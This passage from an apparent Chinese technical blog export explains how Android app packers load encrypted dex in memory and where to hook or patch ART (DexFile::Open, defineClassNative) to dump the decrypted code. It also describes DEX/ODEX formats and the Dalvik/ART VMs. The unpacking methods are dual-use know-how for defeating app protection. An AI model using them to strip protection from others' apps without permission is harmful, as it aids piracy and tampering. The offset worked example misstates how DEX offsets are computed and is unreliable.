就已被创建，可以在此时完成解密、加载等操作。 脱壳流程设计： 在 attachBaseContext() 中替换壳的 ClassLoader，保证后续加载类时能找到源程序的类。 在 onCreate() 中替换壳的 Application，完成全局状态切换。 分析： 脱壳逻辑可以全部在 attachBaseContext() 或 onCreate()中完成，但分步处理更清晰： 在 attachBaseContext() 中修改 ClassLoader，确保后续逻辑能正确加载源程序的类。 在 onCreate() 中完成 Application 替换，既符合逻辑顺序，也避免早期替换影响到 ActivityThread.mInitialApplication。 第二代壳第二代加固壳简介第一代壳与第二代壳对比 特性 第一代壳 第二代壳 加密对象 整个APK文件 .dex 文件 解密位置 文件系统 内存中 加载方式 ClassLoader 加载文件系统中的 APK 动态加载器直接加载内存中的 .dex 数据 保护层级 纯 Java 层 Java + Native 层，可能配合虚拟化保护 安全性 易逆向，落地解密后容易被提取 难逆向，加载逻辑在 Native 层，避免落地解密 性能 低，涉及文件系统读写和两次加载 高，直接从内存加载，减少不必要的 IO 消耗 适用场景 理论验证或简单防护 生产环境，适用于对安全性要求高的商业应用 在第一代加固壳中，会将源程序APK存储到文件系统中，然后再通过DexClassLoader动态加载。这种落地加载方式存在很大问题，一是容易在文件系统中获取到源程序APK，二是两次加载源程序APK到内存中，效率低。 第二代壳就是为了解决上述问题，做到不落地加载，即不使用文件系统作为中转站，而是直接将内存中的源APK字节码进行加载。首先加密对象就不是整个apk而是变成了apk内的代码文件dex，这个时候第二代壳就体现出了其强大的实用性，如果说第一代壳只是一个理论基础而第二代壳就是可以量产的初号机型了。 第一代壳是将其加密的dex文件存放在dex文件里的，由于java可读性较高，这为逆向人员分析脱壳代码降低了难度，因此第二代壳是将dex代码加密到native层，即so文件。大大增加了逆向难度。 根据各大厂商以这个思路加密的手段，又可以分为: DEX动态加载（分为利用jni和自定义jni，即自定义底层函数） Dex Method代码抽取到外部（类抽取加密按需解密和动态方法修改替换） So加密 反调试，防HOOK 不落地加载 （apk目录下不能看到原始dex，把加密的dex文件加载到内存中，然后解密，从始至终不会以文件形式存在） 第二代加固壳的原理仅加密 .dex 文件而非整个 APK，以减少解密开销。加密后的 .dex 数据通常存储在壳的资源文件或 Native 层的 so 文件中。 不再将解密后的 .dex 数据存储到文件系统。直接在内存中解密，并通过自定义加载器（如 InMemoryDexClassLoader）加载到虚拟机运行。 解密逻辑隐藏在 Native 层，通过 JNI 与 Java 层交互。加密算法和解密流程使用 Native 实现，避免被 Java 层反编译分析。 按模块对 .dex 文件进行解密和加载，减少内存占用。设置触发条件，在运行时动态加载目标模块。 具体实现加载内存dexAndroid 4.x 及以前的 BaseDexClassLoader 最终调用了带有三个参数的 native 方法 openDexFile()。 openDexFileNative 方法 在 Android 5.x ~ 7.x，.dex 文件的加载路径发生了变化。最终调用的 openDexFileNative 方法位于 libart.so 中。 在 libart.so 中引入了 OpenMemory 函数，用于直接从内存加载 .dex 数据。OpenMemory 接收内存映射的 .dex 数据 dex_mem_map，而不是文件路径。 解密后的 .dex 数据可以通过 MemMap（内存映射）包装，传递给该函数直接加载。 InMemoryDexClassLoader方法 Android 8.x 引入了 InMemoryDexClassLoader，支持从内存直接加载 .dex 字节码。接收一个或多个 ByteBuffer 对象，表示内存中的 .dex 数据。 通过 BaseDexClassLoader 的逻辑，将这些字节码注册到虚拟机中。 不管哪种方法，它们都会返回一个cookie值，它是对dex文件进行操作的唯一凭据，可以简单理解成dex文件的“身份证”。 内存dex中类的加载在 Android 中，类加载器 ClassLoader 的职责是动态加载类，加载过程可以分为以下步骤： ClassLoader 调用 **loadClass()**。 BaseDexClassLoader 调用 **findClass()**。 DexPathList 调用 **findClass()**。 DexPathList.Element 调用 **findClass()**。 DexFile 调用 **loadClassBinaryName()**。 最终调用 defineClassNative() 完成类的加载。 其中： 3~6 的方法主要起中转作用，不包含实际的类加载逻辑。**defineClassNative()** 是最终完成类加载的本地方法。 自定义类加载器的原理 核心思路 重写 BaseDexClassLoader 的 findClass() 方法，直接调用底层的 **defineClassNative()**。 使用 cookie 提供 .dex 文件的引用，通过获取 .dex 中的类名来决定加载逻辑。 核心问题 如何获取 .dex 中的类名？ 利用 DexFile.getClassNameList(Object cookie) 本地方法，可以获取 .dex 文件中所有的类名。 如何调用 defineClassNative()？ 需要通过反射调用该方法，同时传递合适的参数（包括类名、类加载器、cookie 等）。 如何处理 cookie？ cookie 是 .dex 文件的首地址，DexFile 可以通过 cookie 直接映射和操作 .dex 文件。 defineClassNative 方法的分析 Android 7 之前的实现 12345static jobject DexFile_defineClassNative(JNIEnv* env, jclass, jstring name, jobject loader, jobject cookie) 作用：根据类名 name、类加载器 loader 和 .dex 文件的引用 cookie 定义类。 参数说明： name：要加载的类名。 loader：当前类加载器。 cookie：.dex 文件的首地址，用于访问 .dex 数据。 主要功能： 使用 cookie 解析 .dex 文件。 调用虚拟机的类加载逻辑完成类定义。 Android 7+ 的变化 123456static jobject DexFile_defineClassNative(JNIEnv* env, jclass, jstring name, jobject loader, jobject cookie, jobject dex_file) **新增参数 dex_file**： DexFile 参数主要用于 class_linker-&gt;InsertDexFileInToClassLoader()，将 DexFile 对象关联到类加载器中。 解决方案： 如果不需要 InsertDexFileInToClassLoader 的功能，可以直接传入 null，绕过新增的逻辑。 手动实现类加载逻辑，加载过程不会受影响。 获取 .dex 中类名的实现DexFile 提供了一个本地方法 **getClassNameList(Object cookie)**，可以通过 cookie 获取 .dex 文件中所有的类名： 1private static native String[] getClassNameList(Object cookie); 关键点： cookie 是 .dex 文件的首地址（可从 DexFile 获取）。 返回值是一个包含类名的字符串数组。 实现示例： 123DexFile dexFile = ... // 获取 DexFile 对象Object cookie = getCookie(dexFile); // 通过反射获取 cookieString[] classNames = DexFile.getClassNameList(cookie); 自定义类加载器的实现继承 BaseDexClassLoader，重写 findClass() 方法： 12345678910111213141516171819202122232425262728293031323334353637public class CustomClassLoader extends BaseDexClassLoader &#123; private final Object dexCookie; public CustomClassLoader(ByteBuffer dexBuffer, ClassLoader parent) &#123; super(new ByteBuffer[] &#123; dexBuffer &#125;, null, parent); dexCookie = getCookie(); // 通过反射获取 cookie &#125; @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; if (isDexClass(name)) &#123; // 调用 defineClassNative return defineClass(name, dexCookie); &#125; else &#123; // 交给父类加载 return super.findClass(name); &#125; &#125; private boolean isDexClass(String name) &#123; // 判断类是否存在于 dex 文件中 String[] classNames = DexFile.getClassNameList(dexCookie); return Arrays.asList(classNames).contains(name); &#125; private Class&lt;?&gt; defineClass(String name, Object cookie) &#123; try &#123; Method defineClassNative = DexFile.class.getDeclaredMethod( &quot;defineClassNative&quot;, String.class, ClassLoader.class, Object.class); defineClassNative.setAccessible(true); return (Class&lt;?&gt;) defineClassNative.invoke(null, name, this, cookie); &#125; catch (Exception e) &#123; throw new ClassNotFoundException(&quot;Failed to define class: &quot; + name, e); &#125; &#125;&#125; 使用方法 准备 .dex 文件的字节码。 创建 CustomClassLoader，传入解密后的 .dex 字节码： 12ByteBuffer dexBuffer = ByteBuffer.wrap(decryptedDexData);CustomClassLoader classLoader = new CustomClassLoader(dexBuffer, parentClassLoader); 3.加载类： 1Class&lt;?&gt; clazz = classLoader.loadClass(&quot;com.example.MyClass&quot;); Native 层实现细节在 Native 层，cookie 是 .dex 文件的首地址，通过它可以操作 .dex 文件。 1. cookie 的由来 在 Android 5.1 的 DexFile_defineClassNative： 1const DexFile* dex_file = toDexFiles(cookie, env); cookie 被解析为 DexFile 对象。 在 Android 6+： 1std::unique_ptr&lt;std::vector&lt;const DexFile*&gt;&gt; dex_files = ConvertJavaArrayToNative(env, cookie); cookie 是 DexFile 数组的首地址。 2. 直接获取 DexFile 对象 通过反射或其他方式将 cookie 转换为 DexFile 对象，方便调用相关方法。 一些总结脱壳的关键点确定内存中 .dex 的起始地址和大小 .dex 文件的加载流程中，有多个函数会直接或间接提供 .dex 的内存地址和大小。通过跟踪这些函数，可以准确获取到解密后的 .dex 的内存范围。 常见函数和位置： DexFile::Open(const uint8_t* base, size_t size, ...) OpenMemory(const uint8_t* base, size_t size, ...) DexFileVerifier::Verify(const DexFile* dex_file, const uint8_t* begin, size_t size, ...) 返回 DexFile 对象的函数。 获取方式： Hook 关键函数，拦截参数或返回值。 直接修改源码，打印出对应的地址和大小。 脱壳时机 脱壳时机决定了 dump 的 .dex 文件是否是解密状态。 关键点： 壳程序会先加载加密的 .dex，然后通过解密后再将其交给虚拟机加载。因此，解密后的 .dex 只会存在于内存中，dump 必须在解密后进行。 适合的时机通常是壳完成 .dex的解密并交给系统加载时，例如： DexFile::Open() 函数。 defineClassNative() 调用前后。 类加载完成后，通过调用相关函数遍历 DexFile 对象。 Dump 数据 通过拦截上述脱壳点，将 .dex 数据从内存中拷贝出来，并写入文件。 注意事项： 确保获取到 .dex 数据的完整性。 .dex 数据的起始地址应对齐，避免损坏文件结构。 脱壳点的选择在 Android 的加载流程中，以下位置可以作为脱壳点： 1**DexFile::Open() 系列函数** DexFile::Open()和 OpenMemory()是加载 .dex文件的核心函数，会接收 .dex 的起始地址和大小参数： 1DexFile* DexFile::Open(const uint8_t* base, size_t size, ...) Hook 或修改方法： 在 base 和 size 被传递时，将这段内存直接 dump 出来。 插入代码将内存内容保存到文件中。 2DexFileVerifier::Verify() DexFileVerifier::Verify()验证 .dex 文件是否合法，也会用到 .dex的起始地址和大小： 1bool DexFileVerifier::Verify(const DexFile* dex_file, const uint8_t* begin, size_t size, ...) 作用： 可以在验证阶段拦截到 .dex 数据。 解密后的 .dex 文件通常会经过验证。 3defineClassNative() defineClassNative() 是最终的类定义入口，会加载具体的类。 参数中包含 .dex 文件的 cookie，可以通过 cookie 获取 .dex 数据。 4类加载完成后 可以在加载完成后，通过 DexFile 提供的方法获取所有加载的类和 .dex 数据。 例如，通过反射获取 cookie，再利用 getClassNameList() 遍历类名。 实现脱壳的具体方法相关脱壳方法 内存 Dump 法 缓存脱壳法 文件监视法 Hook 法 定制系统法 动态调试法 1. 通过 Hook 实现 使用工具： Xposed（适合 Java 层 Hook） Frida（适合 Native 层 Hook） Inline Hook 框架（适合底层 Hook，比如 libart.so，使用 Inline Hook 替换 DexFile::Open。） 2.修改源码 在加载流程中直接插入代码，输出 .dex 文件。 源码修改示例：DexFile::Open 找到 DexFile::Open 函数，在解密后插入代码： 1234// Insert this before returning DexFileFILE* file = fopen(&quot;/sdcard/dumped.dex&quot;, &quot;wb&quot;);fwrite(base, 1, size, file);fclose(file); 3. 利用调试器 使用调试工具（如 GDB）设置断点，手动 Dump 数据： 找到 DexFile::Open 或其他脱壳点。 设置断点，获取 base 和 size。 使用调试器保存内存到文件。","categories":[],"tags":[],"keywords":[]},{"title":"安卓（o）dex文件解析","slug":"安卓文件格式","date":"2024-11-20T07:46:18.000Z","updated":"2024-11-21T11:20:39.159Z","comments":true,"path":"2024/11/20/安卓文件格式/","link":"","permalink":"http://example.com/2024/11/20/%E5%AE%89%E5%8D%93%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/","excerpt":"","text":"DEX文件Google 为 Android 中的 Java 代码专门设计了对应的可执行文件 DEX（Dalvik eXecutable File），适用于手机这样的内存低和处理器性能较差的移动平台。 数据类型前缀u表示无符号，s表示有符号 类型 含义 u1 表示1byte的无符号数 u2 表示2bytes的无符号数 u4 表示4bytes的无符号数 u8 表示8bytes的无符号数 sleb128 有符号LEB128，可变长度为1~5bytes uleb128 无符号LEB128，可变长度为1~5bytes uleb128p1 无符号LEB128值 + 1，可变长度为1~5bytes LEB128LEB128（“Little-Endian Base 128”）表示任意有符号或无符号整数的可变长度编码。该格式借鉴了 DWARF3 规范。在 .dex 文件中，LEB128 仅用于对 32 位数字进行编码。 每个 LEB128 编码值均由 1-5 个字节组成，共同表示一个 32 位的值。每个字节均已设置其最高有效位（序列中的最后一个字节除外，其最高有效位已清除）。每个字节的剩余 7 位均为载荷，即第一个字节中有 7 个最低有效位，第二个字节中也是 7 个，依此类推。对于有符号 LEB128 (sleb128)，序列中最后一个字节的最高有效载荷位会进行符号扩展，以生成最终值。在无符号情况 (uleb128) 下，任何未明确表示的位都会被解译为 0。 dex文件结构整体结构 DEX 文件头 字段 偏移量 长度 解释 magic 0x0 8 魔数字段，格式如“dex&#x2F;n035&#x2F;0”，其中035表示dex结构的版本号 checksum 0x8 4 dex文件的校验和，通过它来判断dex文件是否被损坏或篡改 signature 0xC 20 文件剩余内容（除 magic、checksum 和此字段之外的所有内容）的 SHA-1 签名（哈希）；用于对文件进行唯一标识 fileSize 0x20 4 整个dex文件的大小（byte单位） headerSize 0x24 4 dex_header（即DexHeader结构体）的大小 endianTag 0x28 4 指定dex运行环境的cpu字节序（即大端还是小端），有小端字节序（ENDIAN_CONSTANT &#x3D; 0x12345678）和大端字节序（REVERSE_ENDIAN_CONSTANT &#x3D; 0x78563412）两种。 linkSize 0x2C 4 链接段的大小 linkOff 0x30 4 链接段的文件偏移量 mapOff 0x34 4 dex_map_list（即DexMapList结构体）的文件偏移量 stringIdsSize 0x38 4 string_ids区中的字符串索引的个数 stringIdsOff 0x3C 4 string_ids区的文件偏移量（一般与headerSize相等） typeIdsSize 0x40 4 type_ids区中的类型索引的个数 typeIdsOff 0x44 4 type_ids区的文件偏移量 protoIdsSize 0x48 4 proto_ids区中的方法原型索引的个数 protoIdsOff 0x4C 4 proto_ids区的文件偏移量 fieldIdsSize 0x50 4 field_ids区中的域索引的个数 fieldIdsOff 0x54 4 field_ids区的文件偏移量 methodIdsSize 0x58 4 method_ids区中的方法索引的个数 methodIdsOff 0x5C 4 method_ids区的文件偏移量 classDefsSize 0x60 4 class_def区中的类的个数 classDefsOff 0x64 4 class_def区的文件偏移量 dataSize 0x68 4 data区的大小，必须为4字节的整数倍 dataOff 0x6C 4 data区的文件偏移量 string_ids（DexStringId列表）StringIds 区段包含stringIdsSize个DexStringId结构，其结构如下： 123struct DexStringId &#123; u4 stringDataOff; /* 字符串数据偏移，也就是数据区中各个 StringData 的文件偏移*/&#125;; 可以看出 DexStringId 中存储的只是每一个字符串的相对偏移。此外，每一个偏移占据 4 个字节，字符串部分一共会占据 4*stringIdsSize 个字节。 在对应的偏移处，字符串是使用 MUTF-8 格式存储的，其开头存储了之前我们所说的 LEB128 类型的变量，表示字符串的长度，之后紧跟着的就是字符串，之后以\\x00 结尾，字符串的长度不包含\\x00。 type_ids（DexTypeId列表）type_ids 区索引了 java 代码中使用的所有类型（类、数组或基本类型），此列表必须按 string_id 索引进行排序，并且不能重复。string_ids[type_ids]就是地址。 123struct DexTypeId &#123; u4 descriptorIdx; /* 指向 DexStringId列表的索引 */&#125;; proto_ids（DexProtoId列表）Proto id 字段主要是针对于 java 中的方法原型而设计的，这里面主要包含了一个方法声明的返回类型与参数列表，对于方法名尚未涉及。其主要包含以下三个数据结构 1234567891011121314struct DexProtoId &#123; u4 shortyIdx; /* 返回类型+参数类型，简写，指向DexStringId列表的索引 string_ids[shortyIdx]*/ u4 returnTypeIdx; /* 返回类型，指向DexTypeId列表的索引 type_ids[returnTypeIdx]*/ u4 parametersOff; /* 参数类型，指向DexTypeList的偏移 */&#125;struct DexTypeList &#123; u4 size; /* DexTypeItem的个数，即参数个数 */ DexTypeItem list[1]; /* 指向DexTypeItem开始处 */&#125;;struct DexTypeItem &#123; u2 typeIdx; /* 参数类型，指向DexTypeId列表的索引，最终指向字符串索引type_ids[typeIdx] */&#125;; field_ids（DexFieldId列表）field id 区主要是针对于 java 中每个类的字段而设计的，DexFieldId结构体指明了成员变量所在的类、类型以及变量名。，主要涉及到以下数据结构 12345struct DexFieldId &#123; u2 classIdx; /* 类的类型，指向DexTypeId列表的索引 */ u2 typeIdx; /* 字段类型，指向DexTypeId列表的索引 */ u4 nameIdx; /* 字段名，指向DexStringId列表的索引 */&#125;; method_ids（DexMethodId列表）method id 区是直接为 java 中的方法而设计的，其包含了方法所在的类，方法的原型，方法的名字。 12345struct DexMethodId &#123; u2 classIdx; /* 方法的所属的类，指向DexTypeId列表的索引 */ u2 protoIdx; /* 声明类型，指向DexProtoId列表的索引 */ u4 nameIdx; /* 方法名，指向DexStringId列表的索引 */&#125;; class_def（DexClassDef列表）classDefsSize 表明 class def 区域的大小，classDefsOff 表明 class def 区的偏移。 该区是为 java 中的类而设计的，包含以下的数据结构，相关信息如下 1234567891011121314151617181920212223242526272829303132333435363738394041struct DexClassDef &#123;// 类的基本信息 u4 classIdx; /* 类的类型（即全限定类名），指向DexTypeId列表的索引 */ u4 accessFlags; /* 访问标志，它是以ACC_开头的一个枚举值，例如ACC_PUBLIC（0x1）、ACC_PRIVATE（0x2）*/ u4 superclassIdx; /* 父类类型，指向DexTypeId列表的索引*/ u4 interfacesOff; /* 接口，指向DexTypeList的文件偏移，如果类中不含有接口声明和实现，则值为0 */ u4 sourceFileIdx; /* 类所在源文件的文件名，指向DexStringId列表的索引 */ u4 annotationsOff; /* 注解，指向DexAnnotationsDirectoryItem结构体，根据类型不同会有注解类、注解方法、注解字段与注解参数，如果类中没有注解，则值为0 */ u4 classDataOff; /* 指向DexClassData结构的文件偏移，DexClassData结构是类的数据部分 */ u4 staticValuesOff; /* 指向DexEncodedArray结构的文件偏移，DexEncodedArray结构记录类中的静态数据 */&#125;;struct DexClassData &#123;// 类的字段与方法概况 DexClassDataHeader header; /* 指定字段与方法的个数的DexClassDataHeader结构体 */ DexField* staticFields; /* 静态字段，DexField结构体 */ DexField* instanceFields; /* 实例字段，DexField结构体 */ DexMethod* directMethods; /* 直接方法，DexMethod结构体 */ DexMethod* virtualMethods; /* 虚方法，DexMethod结构体 */&#125;;struct DexClassDataHeader &#123;// 详细描述类的字段个数与方法个数 u4 staticFieldsSize; /* 静态字段个数 */ u4 instanceFieldsSize; /* 实例字段个数 */ u4 directMethodsSize; /* 直接方法个数 */ u4 virtualMethodsSize; /* 虚方法个数 */&#125;;struct DexField &#123;// 字段定义 u4 fieldIdx; /* 指向DexFieldId的索引 */ u4 accessFlags; /* 访问标志 */&#125;;struct DexMethod &#123;// 方法定义 u4 methodIdx; /* 指向DexMethodId的索引 */ u4 accessFlags; /* 访问标志 */ u4 codeOff; /* 指向DexCode结构的偏移 */&#125;;struct DexCode &#123;// 代码概况 u2 registersSize; /* 使用的寄存器个数 */ u2 insSize; /* 参数个数 */ u2 outsSize; /* 调用其他方法时其它方法使用的寄存器个数，会在自己的调用栈申请，并压栈（猜测） */ u2 triesSize; /* Try/Catch个数 */ u4 debugInfoOff; /* 指向调试信息的偏移 */ u4 insnsSize; /* 指令集个数，以2字节为单位 */ u2 insns[1]; /* 指令集 */&#125;; DEX map sectionDexHeader 中的 mapOff 字段给出了 DexMapList 结构在 DEX 文件中的偏移。当 Dalvik 虚拟机解析 DEX 文件后的内容后，会将内容映射到 DexMapList 数据结构，可以说该结构描述了对应的 DEX 文件的整体概况。其具体代码如下 12345678910111213141516171819202122232425262728293031323334struct DexMapList &#123; u4 size; /* DexMapItem的个数，方便解析 */ DexMapItem list[1]; /* 指向DexMapItem */&#125;;struct DexMapItem &#123; u2 type; /* kDexType开头的类型 */ u2 unused; /* 未使用，用于字节对齐 */ u4 size; /* 指定相应类型的个数 */ u4 offset; /* 指定相应类型的数据的文件偏移 */&#125;;/* type字段为一个枚举常量，通过类型名称很容易判断它的具体类型。 *//* map item type codes */enum &#123; kDexTypeHeaderItem = 0x0000, kDexTypeStringIdItem = 0x0001, kDexTypeTypeIdItem = 0x0002, kDexTypeProtoIdItem = 0x0003, kDexTypeFieldIdItem = 0x0004, kDexTypeMethodIdItem = 0x0005, kDexTypeClassDefItem = 0x0006, kDexTypeMapList = 0x1000, kDexTypeTypeList = 0x1001, kDexTypeAnnotationSetRefList = 0x1002, kDexTypeAnnotationSetItem = 0x1003, kDexTypeClassDataItem = 0x2000, kDexTypeCodeItem = 0x2001, kDexTypeStringDataItem = 0x2002, kDexTypeDebugInfoItem = 0x2003, kDexTypeAnnotationItem = 0x2004, kDexTypeEncodedArrayItem = 0x2005, kDexTypeAnnotationsDirectoryItem = 0x2006,&#125;; 定位方法的字节码解析dex解析dex获取类名获取类名的索引l：类名索引|—&gt;type表索引|—&gt;字符串表索引 解析dex获得方法名获取方法的索引，再根据方法的索引去找字符串的索引 解析dex获得签名获取返回值签名：类的索引|—&gt;pro表的索引|—-&gt;type索引—–&gt;字符串表索引获取参数签名：类的索引|—-&gt;pro表的索引l，并计算结构体—-&gt;type表的索引|—–&gt;字符串表的索引 假设我们需要解析 DEX 文件中的某个方法的字节码，我们会经历以下步骤： 步骤 1：读取文件头，获取段的绝对偏移 从文件头中读取 class_defs_offset 和 class_defs_size，找到类定义表的起始绝对偏移。 假设 class_defs_offset = 0x1000。 步骤 2：定位类定义，读取类的相关偏移 在类定义表中，每个 class_def_item 包含一个 class_data_off，表示类数据的相对偏移。 假设 class_data_off = 0x200。 计算类数据的绝对偏移： \\text{类数据绝对偏移} &#x3D; \\text{class_defs_offset} + \\text{class_data_off} &#x3D; 0x1000 + 0x200 &#x3D; 0x1200 步骤 3：定位方法的 code_item 偏移 在类数据中，每个方法对应一个 code_off，表示方法字节码的相对偏移。 假设 code_off = 0x300。 计算方法代码的绝对偏移： \\text{方法代码绝对偏移} &#x3D; \\text{类数据绝对偏移} + \\text{code_off} &#x3D; 0x1200 + 0x300 &#x3D; 0x1500 步骤 4：读取字节码 通过计算的绝对偏移（0x1500），读取 code_item 的结构，解析方法的字节码和其他信息。 名称 含义 示例 头相对偏移 各数据段相对于文件头部（起始位置）的偏移 class_defs_offset = 0x1000 头绝对偏移 文件头部的绝对偏移，通常为 0 文件头绝对偏移 &#x3D; 0x0 具体定位相对偏移 数据段内某条目的偏移，描述其相对于段起始位置的偏移 class_data_off = 0x200 具体定位绝对偏移 通过段绝对偏移和相对偏移计算出的全局偏移，用于文件中的精确定位 odexODEX（Optimized DEX）文件是 Android 系统中经过优化的 .dex 文件，是 Android 应用在安装或运行时生成的文件，用于提高应用的启动速度和运行效率。 来源与作用. 来源 原始 DEX 文件：Android 应用的核心字节码文件是 .dex 文件，存储在 APK（Android Package）中，供 Dalvik 或 ART 虚拟机执行。 ODEX 文件生成：当应用安装到设备上时，Android 系统会将 APK 中的 .dex文件进行优化处理，生成 ODEX 文件。 优化过程是通过 dexopt 工具完成的（在 Dalvik 虚拟机时代）。 在 ART（Android Runtime）下，对应的优化文件是 .oat 文件。 ** 作用** 启动优化： 通过将 .dex 文件中的字节码优化为特定硬件架构的更高效格式，加快应用启动速度。 减少内存占用： 提供了一种共享库的机制，使得同一个类的实例可以在不同进程间共享。 安全性： 部分设备和 ROM 会将 ODEX 文件存储在特定的系统分区中，防止篡改，增强安全性。 ODEX 文件的结构 odex文件头123456789101112131415struct DexOptHeader &#123; u1 magic[8]; /* odex标识(dey)+版本号 */ u4 dexOffset; /* dex文件头的文件偏移量 */ u4 dexLength; /* dex文件的总长度 */ u4 depsOffset; /* odex依赖库列表的文件偏移量 */ u4 depsLength; /* 依赖库列表的总长度 */ u4 optOffset; /* odex辅助数据的文件偏移量 */ u4 optLength; /* 辅助数据的总长度 */ u4 flags; /* 标识DVM加载odex时的优化与验证选项 */ u4 checksum; /* 依赖库与辅助数据的校验和(算法adler32) */ /* pad for 64-bit alignment if necessary */&#125;; 依赖库123456789101112struct Dependences&#123; u4 modWhen; /* 优化前dex文件的时间戳 */ u4 crc; /* 优化前dex文件的crc校验值 */ u4 DALVIK_VM_BUILD; /* Dalvik虚拟机版本号 */ u4 numDeps; /* 依赖库个数 */ struct&#123;/* 依赖库结构体 */ u4 len; /* name字符串的长度 */ u1 name[len]; /* 依赖库的完整路径名 */ u1 signature[kSHA1DigestLen]; /* sha-1哈希值 */ &#125;tabel[numDeps]; &#125; 辅助数据该部分有三个Chunk块，它们被Dalvik虚拟机加载到一个称为auxillart的段中。这三个Chunk块，都以一个header联合体开头，定义如下： 1234567union&#123; char raw[8]; struct&#123; u4 type; u4 size; &#125;ts;&#125;header; union是联合体，里面的变量共用同一空间，所以大小为8字节。其中type字段为枚举常量，具体如下： 12345eum&#123; kDexChunkClassLookup = 0x434c4b50, /* 对应字符串CLKP */ kDexChunkRegisterMaps = 0x524d4150, /* 对应字符串RMAP */ kDexChunkEnd = 0x41454e44, /* 对应字符串AEND */&#125; size字段表示需要填充的数据的字节数。 ChunkClassLookup结构,Dalvik虚拟机通过DexClassLookup结构来检索dex文件中所有的类。 123456789101112131415struct ChunkClassLookup&#123; header联合体; struct DexClassLookup&#123; int size; /* DexClassLookup结构使用的字节数，包括size字段在内 */ int numEntries; /* 接下来的tabel结构的个数 */ struct &#123; /* 描述类的信息的结构体 */ u4 classDescriptorHash; /* 类的哈希值 */ int classDescriptorOffset; /* 类的描述，值为文件偏移量 */ int classDefOffset; /* 指向DexClassDef结构，值为文件偏移量 */ &#125; table[1]; &#125;;&#125;; ChunkRegisterMapPool结构体： 123456789101112131415struct ChunkRegisterMapPool &#123; header联合体; struct&#123; struct RegisterMapClassPool&#123; u4 numClasses; /* 类的个数 */ u4 classDataOffset[1]; /* 指向类的映射信息的偏移量 */ &#125;classpool; struct RegisterMapMethodPool&#123; u2 methodCount; /* 方法的个数 */ u4 methodData[1]; /* 方法的映射信息（连续存储） */ &#125;; &#125;MapPool;&#125;; ChunkEnd结构体： 123struct&#123; header联合体;&#125;; ODEX 文件的生成与使用流程** 在 Dalvik 虚拟机时代** APK 安装时生成： 在 Dalvik 虚拟机上，系统会在安装 APK 时运行 dexopt，将 .dex 文件优化成 .odex 文件，存储在设备的 /data/dalvik-cache/ 或 /system/app/ 目录下。 共享库功能： 优化后的 .odex 文件可以作为共享库，减少不同应用中相同类加载的冗余。 ** 在 ART 虚拟机时代** 在 ART 上，系统不再直接生成 .odex 文件，而是生成更高效的 .oat 文件。 优化流程（AOT 编译）： APK 安装时，系统将 .dex 文件编译为本地机器码，生成 .oat 文件。 优化后的 .oat 文件与原始 APK 一起存储。 如何查看 ODEX 文件** 手动查看** 使用 adb shell查看设备上的 ODEX 文件： 1ls /data/dalvik-cache/ 查看 /system/app/ 目录下的系统应用是否包含 .odex 文件。 ** 反编译工具** 使用反编译工具（如 Baksmali 或 JADX）： 通过 Baksmali 将 .odex 文件反编译为 .smali 文件。 示例： 1java -jar baksmali.jar -x MyApp.odex dex、odex、oat、ydex文件区别dex文件：先将java文件编译成class文件，然后用Android将所有的class文件打包，形成Dalvik运行的可执行文件–dex。（Dalvik字节码） odex文件：优化过的dex文件，Apk在安装时会进行验证和优化，通过dexopt生成odex文件，加快Apk的响应时间。在Android 5之后，.odex就不再是odex文件了，而是oat文件，文件头是”ELF”。 oat文件：Android私有ELF文件格式，由dex2oat处理生成，包含（原dex文件+dex翻译的本地机器指令），是ART虚拟机便用的文件，可以直接加载 vdex文件：Android8.0引l入，包含APk的未压缩DEx代码，以及一些旨在加快验证速度的元数据，其目的主要是为了跳过verified流程，减少dex2oat执行时间。","categories":[],"tags":[],"keywords":[]},{"title":"安卓虚拟机与编译","slug":"安卓虚拟机与编译","date":"2024-11-20T07:10:17.000Z","updated":"2024-11-20T07:45:09.122Z","comments":true,"path":"2024/11/20/安卓虚拟机与编译/","link":"","permalink":"http://example.com/2024/11/20/%E5%AE%89%E5%8D%93%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E7%BC%96%E8%AF%91/","excerpt":"","text":"JVM传统的Java虚拟机，基于栈，运行class文件。 工作原理编译与加载： 开发者编写的 .java 源文件被编译器（javac）转换为 .class 文件（字节码）。 JVM 的类加载器（ClassLoader）将 .class 文件加载到内存中。 解释执行： JVM 的执行引擎读取字节码，并将其解释为底层机器指令。 对于高频代码段，JIT 编译器会将字节码直接编译为机器码执行，避免解释的开销。 内存管理： JVM 为对象分配内存（通常在堆中）。 垃圾回收器（GC）定期回收不再使用的对象，释放内存空间。 编译策略JIT（Just-In-Time）即运行时编译策略，可以理解成一种运行时编译器，此时Andriod的虚拟机使用的是Dalivik，为了加快Dalvik虚拟机解释dex的速度，运行时动态地执行频率很高的dex字节翻译成本地机器码 缺点： 每次重启都需要重新编译 运行时比较耗电，造成电池额外开销 AOT（Ahead-Of-Time）在应用安装时将 DEX 文件编译为本地机器码，存储在设备上。一种运行前编译的策略 缺点： 应用安装和升级之后的应用优化比较耗时 优化后的文件会占用额外的存储空间 两者区别IT是在运行时进行编译，是动态编译，并目每次运行程序的时候都需要对odex重新进行编译AOT是静态编译，应用在安装的时候会启动dex2oat过程把dex预编译成ELF文件，每次运行程序的时候不用重新编译，是真正意义上的本地应用Android7.0后安装时不会编译、运行时热点函数jit编译、休息时采用AoT预编译 Dalvik虚拟机早期的 Android 系统采用的是 Dalvik 虚拟机，由 Google 开发，支持已转换成dez格式的安卓应用，执行指令更快，加载的是odex（优化的dex） 基于寄存器的架构：相比传统 Java 虚拟机（JVM）的基于堆栈架构，Dalvik 使用寄存器架构，能够更高效地执行指令。 DEX 格式：Dalvik 不直接运行 Java 字节码，而是运行通过 dx 工具转换后的 .dex（Dalvik Executable）格式文件。这种格式针对内存占用进行了优化。 多实例：Dalvik 为每个应用分配独立的虚拟机实例，隔离不同应用的运行环境，增强了安全性。 Dalvik 的工作原理 编译流程：Java 源代码 → 编译成 .class 文件（Java 字节码） → 转换为 .dex 文件。 加载和执行： 应用启动时，Dalvik 将 .dex 文件加载到内存，并解释执行其中的字节码。 Dalvik VM 通过 JIT（Just-In-Time）编译器在运行时将部分字节码动态编译为机器码，以提升性能。 ART虚拟机从 Android 5.0（Lollipop）开始，ART 替代 Dalvik 成为默认的运行时环境。 提前编译（AOT，Ahead of Time）：在应用安装时，ART 将字节码编译为机器码，避免运行时编译，从而提高性能。 内存效率：ART 在垃圾回收和内存分配上进行了优化，更适合现代智能手机。 向后兼容：ART 仍然支持运行 Dalvik 的 